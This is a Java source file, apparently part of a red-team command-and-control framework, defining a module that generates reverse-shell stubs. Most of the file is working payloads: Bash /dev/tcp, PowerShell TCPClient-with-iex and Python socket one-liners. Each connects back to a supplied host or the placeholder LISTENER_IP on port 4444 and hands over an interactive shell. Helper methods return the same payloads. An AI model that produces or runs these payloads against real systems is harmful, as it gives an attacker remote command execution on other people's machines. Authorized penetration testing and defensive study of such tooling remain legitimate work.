package fr.redteam.c2;

import fr.redteam.core.Module;
import fr.redteam.core.Report;
import fr.redteam.core.Target;

public class AgentStubGenerator implements Module {

    private static final String CATEGORY = "AgentStub";

    @Override
    public String getName() {
        return "AgentStubGenerator";
    }

    @Override
    public String getDescription() {
        return "Générateur de stubs agent (one-liner, reverse shell)";
    }

    @Override
    public void run(Target target, Report report) {
        String host = target.getHost();
        int port = target.getPort();
        if (host == null || host.isEmpty()) {
            host = "LISTENER_IP";
        }
        if (port <= 0) {
            port = 4444;
        }

        report.addFinding(CATEGORY, "Bash reverse shell: bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1");
        report.addFinding(CATEGORY, "PowerShell: powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('" + host + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1;$r2=$r+'\\n';$s2=[text.encoding]::UTF8.GetBytes($r2);$s.Write($s2,0,$s2.Length)}\"");
        report.addFinding(CATEGORY, "Python: python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + host + "\"," + port + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'");
    }
    public String generateBashReverseShell(String host, int port) {
        return "bash -i >& /dev/tcp/" + (host != null ? host : "LISTENER_IP") + "/" + port + " 0>&1";
    }

    public String generatePowerShellReverseShell(String host, int port) {
        return "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('" + (host != null ? host : "LISTENER_IP") + "'," + port + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1;$r2=$r+'\\n';$s2=[text.encoding]::UTF8.GetBytes($r2);$s.Write($s2,0,$s2.Length)}\"";
    }
}
